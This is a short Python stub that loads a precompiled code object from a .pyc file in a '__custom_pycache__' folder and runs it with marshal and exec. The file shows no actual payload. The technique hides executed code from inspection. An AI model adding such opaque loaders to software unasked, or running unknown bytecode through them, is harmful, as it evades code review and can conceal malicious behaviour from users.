
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'params_ac27f455672a441882f104629d62d530.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
